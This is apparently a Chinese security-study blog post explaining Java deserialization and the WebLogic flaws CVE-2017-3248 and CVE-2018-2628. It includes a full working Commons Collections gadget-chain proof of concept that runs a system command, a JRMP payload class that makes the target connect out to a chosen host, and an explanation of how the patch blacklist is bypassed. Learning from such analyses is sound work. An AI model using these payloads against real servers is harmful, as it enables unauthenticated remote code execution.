# Weblogic 反序列化漏洞

之前没有很仔细的接触过Weblogic的反序列化漏洞，近期又出现了一个weblogic的反序列化漏洞问题（CVE-2018-2628）决定系统的对weblogci来学习一下。



#### 1.java序列化与反序列化

序列化： Java 对象转换为字节序列的过程

​		序列化的目的：便于保存在内存、文件、数据库中

​		ObjectOutputStream 类的 writeObject() 方法可以实现序列化 

反序列化：把字节序列恢复为 Java 对象的过程 

​		   ObjectInputStream 类的 readObject() 方法用于反序列化 



#### 2.JAVA RMI：

##### RMI（远程方法调用）

​	是 Java 的一组拥护开发分布式应用程序的 API，实现了不同操作系统之间程序的方法调用。 能够让某个java虚拟机上的对象想调用本地对象一样去调用另一个java虚拟机中对象上的方法。

​	特点：RMI的传输100%基于反序列化

​	默认端口为：1099

##### JRMP

​	java 远程消息交换协议。

​	用于查找和引用远程对象的协议

​	调用在RMI之前，TCP/IP之上的线路层协议



#### 3.Java 反射机制

  可以在运行期(Runtime)获得：

​	a. 判断任意一个对象所属的类（即获取Class对象）

​		*(a-1)调用某个对象的getClass()方法*

```java
StringBuilder str = new StringBuilder("123");
Class<?> klass = str.getClass();
```

​		*(a-2)直接获取某一个对象的class*

```java
//获取int所对应的Class对象
Class<?> klass = int.class
```

​	b.构造任意一个类的对象(即创建实例)

​		*(b-1)使用class对象的newInstance()方法来创建Class对应类的实例*

```java
//获取String所对应的Class对象
Class<?> c = String.class
Object str = c.newInstance()
```

​		*(b-2)先通过Class对象获取指定的Constructor对象，再调用Constructor对象的newInstance()方法来创建实例。这种方法可以用指定的构造器构造类的实例*

```java
//获取String所对应的Class对象
Class<?> c = String.class;
//获取String类带一个String参数的构造器
Constructor constructor = c.getConstructor(String.class);
//根据构造器创建实例
Object obj = constructor.newInstance("23333");
System.out.println(obj);
```

​	c.判断一个类所具有的成员变量和方法（private也可以）

​	d.调用任意一个对象的方法(获取某个Class对象的方法)

​		*(d-1)getDeclaredMethods()方法返回类或接口声明的所有方法，包括公共、保护、默认（包）访问和私有方法，但不包括继承的方法*

```java
public Method[] getDeclaredMethods() throws SecurityException
```

​		*(d-2)getMethods()方法返回某个类的所有公用（public）方法，包括其继承类的公用方法。*

```java
public Method[] getMethods() throws SecurityException
```

 		*(d-3)getMethod方法返回一个特定的方法，其中第一个参数为方法名称，后面的参数为方法的参数对应Class的对象* 

```java
public Method getMethod(String name, Class<?>... parameterTypes)
```

如果还是不太明白，可以看大佬的博客，关于java反射机制讲的超级详细

[sczyh30]: https://www.sczyh30.com/posts/Java/java-reflection-1/



#### 4.Apache CommonsCollections

是一个扩展了Java标准库里的Collection结构的第三方基础库。提供了很多有力的数据结构类型

Commons Collection实现了一个TransformedMap类(是Java标准数据结构Map接口的一个扩展)

##### TransformedMap类

1.一个元素加入到集合内 ，自动对该元素进行特定的修饰变换(如何变换Transformer类决定，该类在TransformedMap实例化时作为参数传入)

2.当key或者value发生变化，会触发相应的Transformer()方法。

```java
Map tansformedMap = TransformedMap.decorate(map,keyTransformer，valueTransformer)；
```

3.在Apache Commons Collection已经内置了一些常用的Transformer

##### InvokerTransformer类

就是上述的在Apache Commons Collection已经内置了常用的Transformer之一

```java
public class InvokerTransformer implements Transformer, Serializable {
    private static final long serialVersionUID = -8653385846894047688L;
    private final String iMethodName;
    private final Class[] iParamTypes;
    private final Object[] iArgs;
    private InvokerTransformer(String methodName) {
        this.iMethodName = methodName;
        this.iParamTypes = null;
        this.iArgs = null;
    }
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }
    public Object transform(Object input) {
        if(input == null) {
            return null;
        } else {
            try {
                //使用反射机制
                //调用input对象的getClass()方法
                Class cls = input.getClass();
                //getMethod方法返回一个特定的方法，其中第一个参数为方法名称，后面的参数为方法的参数对应Class的对象
                //调用input对应的方法 --> 可控的this.iMethodName
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                //当我们从类中获取了一个方法后，我们就可以用invoke()方法来调用这个方法
                return method.invoke(input, this.iArgs);
            } catch (final NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" +input.getClass() + "' does not exist");
        } catch (final IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (final InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }

}
```



通过源码分析，可以看到反射机制处的this.iMethodName和 this.iParamTypes是实例化InvokerTransformer时候传入的两个参数，也就是说，这两个参数(调用的方法和调用的方法的class对象)是可控的。这就产生了漏洞，也就是JAVA Apache-CommonsCollections 序列化RCE漏洞



####  5.JAVA Apache-CommonsCollections 序列化RCE漏洞 

##### 漏洞主要产生原因

​	1.运用了Apache Commons Collections中的InvokerTransformer类实现了Transformer(调用了反射机制) 

​	2.配合了TransformedMap+sun.reflect.annotation.AnnotationInvocationHandler中的readObject()方法(重写了readObject方法)

##### 主要逻辑

Clent构造恶意序列化payload，然后把恶意构造的payload发送到server中，server进行了反序列化，触发了重写的readObject()，readObject方法触发了内部的InvokerTransformer，然后触发了漏洞

##### 完整的POC

```java
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
public class test3 {
    public static Object Reverse_Payload() throws Exception {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "open /Applications/Calculator.app" }) };
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map innermap = new HashMap();
        innermap.put("value", "value");
        Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
        //通过反射获得AnnotationInvocationHandler类对象
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        //通过反射获得cls的构造函数
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        //这里需要设置Accessible为true，否则序列化失败
        ctor.setAccessible(true);
        //通过newInstance()方法实例化对象
        Object instance = ctor.newInstance(Retention.class, outmap);
        return instance;
    }

    public static void main(String[] args) throws Exception {
        GeneratePayload(Reverse_Payload(),"obj");
        payloadTest("obj");
    }
    public static void GeneratePayload(Object instance, String file)
            throws Exception {
        //将构造好的payload序列化后写入文件中
        File f = new File(file);
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(instance);
        out.flush();
        out.close();
    }
    public static void payloadTest(String file) throws Exception {
        //读取写入的payload，并进行反序列化
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
        in.readObject();
        in.close();
    }
}
```

##### 构造序列化恶意payload的部分

恶意代码的本质是调用Runtime() 执行一段系统命令：

```java
((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null)).exec("open /Applications/Calculator.app")
```

```java
public static Object Reverse_Payload() throws Exception {
        Transformer[] transformers = new Transformer[] {
            	//ConstantTransformer可以将待变换的对象，变为一个常量  返回iConstant属性
            	//iConstant属性 --> class java.lang.Runtime
            	//此处object被赋值为Runtime.class
                new ConstantTransformer(Runtime.class),
            	//new InvokerTransformer.... 都为InvokerTransformer对象-->形成一个Transformer的数组--->transformerChain一次触发给子的transform方法
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }),
                new InvokerTransformer("exec", new Class[] { String.class }, new Object[] { "open /Applications/Calculator.app" }) };
    	//transformerChain传入Transformer数组，再使用for循环调用Transformer数组中的transform()方法 参数为object
    	//object = iTransformers[i].transform(object)
        Transformer transformerChain = new ChainedTransformer(transformers);
```

在此处iArgs 分别为 getRuntime null "open /Applications/Calculator.app"

iMethodName分别为getMethod invoke exec

##### 利用漏洞

存在反射机制和transformer结合可以导致任意代码执行的情况，但是要找到地方利用此漏洞。

在进行反序列化的时候会调用ObjectInputStream类的readObject()方法 ，如果反序列化的类重写了readObject()，那么会优先调用重写的的readObject()。

那么总结一下，利用漏洞的两个条件：

1.使用了Commons Collections这个第三方类库

2.某个可序列化的类重写了readObject()方法，并且在readObject()中对Map类型的变量进行了键值修改操作，并且这个Map变量是可控的，

而AnnotationInvocationHandler 这个类满足条件

![1526829974598](C:\Users\asus\AppData\Local\Temp\1526829974598.png)

该类存在成员变量memberVaules 而它的类型为Map<String,Object>

![1526830056992](C:\Users\asus\AppData\Local\Temp\1526830056992.png)

重写方法存在memberValue.setVaule()的操作

只要实例化一个AnnotationInvocationHandler类然后将构造好的恶意TransformedMap对象赋值给memberVaules,在java反序列化操作时，触发TransformedMap变化函数(TransformedMap.decorate)

```java
 	    Map innermap = new HashMap();
        innermap.put("value", "value");
        Map outmap = TransformedMap.decorate(innermap, null, transformerChain);
        //通过反射获得AnnotationInvocationHandler类对象
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        //通过反射获得cls的构造函数
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
        //这里需要设置Accessible为true，否则序列化失败
        ctor.setAccessible(true);
        //通过newInstance()方法实例化对象
        Object instance = ctor.newInstance(Retention.class, outmap);
        return instance;
```



#### 6.ysoserial

一个研究java反序列化的工具

其中它有8个payload

![1526887113638](C:\Users\asus\AppData\Local\Temp\1526887113638.png)



关于这个工具及其payloads，wooyun有详细的介绍

[反序列化工具ysoserial分析]: https://wps2015.org/drops/drops/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7ysoserial%E5%88%86%E6%9E%90.html







#### CVE-2017-3248

##### 产生原因：

RMI机制缺陷，使用JRMP协议达到执行任意反序列化payload的目的

##### 利用：

1.使用ysoserial的JRMPLister，反序列化RemoteObjectInvocationHandler ，RemoteObjectInvocationHandler 使用UnicastRef建立到远端的TCP链接获取RMI registry

2.使用JRMP协议，客户端响应服务端任何内容，实现未经身份验证远程代码执行

##### 主要步骤：

​	1.监听JRMP协议端口

​	2.通过T3协议发送反序列化payload

​	3.触发漏洞





 



#### CVE-2018-2628

##### 基本原理和危害：

产生原因:weblogci对于T3协议发送的数据包没有过滤

危害：可以使远程攻击者在未授权的情况下远程执行代码，提升系统权限

1.当开放weblogic控制台端口(7001)的时候，T3服务会默认开启。

2.CVE漏洞利用的第一步是与weblogic服务器开放在服务端口上的T3服务建立socket连接

3.握手(连接)成功后，可以发送构造的payload到服务端，导致反序列化命令的执行。



##### 构造payload

流程：注册一个RMI接口，通过T3协议建立连接。攻击7001端口上的T3服务，该服务会解包Object结构(一步步解包)，利用readObject解析，解析到服务器上1099端口请求而已封装的代码，导致漏洞执行。

##### poc

```java
//使用了ysoserial中的ObjectPayload接口
//ObjectPayload是定义的接口，所有的Payload需要实现这个接口的getObject方法
public class JRMPClient2 extends PayloadRunner implements ObjectPayload<Activator> {

    public Activator getObject ( final String command ) throws Exception {

        String host;
        int port;
        int sep = command.indexOf(':');
        if ( sep < 0 ) {
            port = new Random().nextInt(65535);
            host = command;
        }
        else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID id = new ObjID(new Random().nextInt()); // RMI registry
        TCPEndpoint te = new TCPEndpoint(host, port);
        //RemoteObjectInvocationHandler，它会利用UnicastRef建立到远端的tcp连接获取RMI registry
        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
        //可以使用java.rmi.activation.Activator来替代java.rmi.registry.Registry生成payload
        Activator proxy = (Activator) Proxy.newProxyInstance(JRMPClient2.class.getClassLoader(), new Class[] {
            Activator.class
        }, obj);
        return proxy;
    }


    public static void main ( final String[] args ) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient2.class.getClassLoader());
        PayloadRunner.run(JRMPClient2.class, args);
    }
}
```



UnicastRemoteObject 用于导出带JRMP的远程对象和获得与该远程对象通信的stub，如果无法找到适当的stub，可以构造Proxy，代理的调用处理程序是用RemoteRef构造的RemtoeObjectInvocationHandler

（只是绕过CVE-2017-3248的黑名单补丁）

##### 绕过

CVE-2017-3248的补丁是一个黑名单，在`weblogic.rjvm.InboundMsgAbbrev$ServerChannelInputStream.class`多了一个`resolveProxyClass` 

```java
protected Class<?> resolveProxyClass(String[] interfaces) throws IOException, ClassNotFoundException {
   String[] arr$ = interfaces;
   int len$ = interfaces.length;

   for(int i$ = 0; i$ < len$; ++i$) {
      String intf = arr$[i$];
      if(intf.equals("java.rmi.registry.Registry")) {
         throw new InvalidObjectException("Unauthorized proxy deserialization");
      }
   }

   return super.resolveProxyClass(interfaces);
}
```

可以看到只是对`java.rmi.registry.Registry`做了判断，只要再找一个rmi接口就可以绕过







转载并总结：

[Seebug]: https://paper.seebug.org/584/
[腾讯安全应急响应中心]: https://security.tencent.com/index.php/blog/msg/97
[漏洞盒子]: https://www.vulbox.com/knowledge/detail/?id=11
[sczyh30]: https://www.sczyh30.com/posts/Java/java-reflection-1/

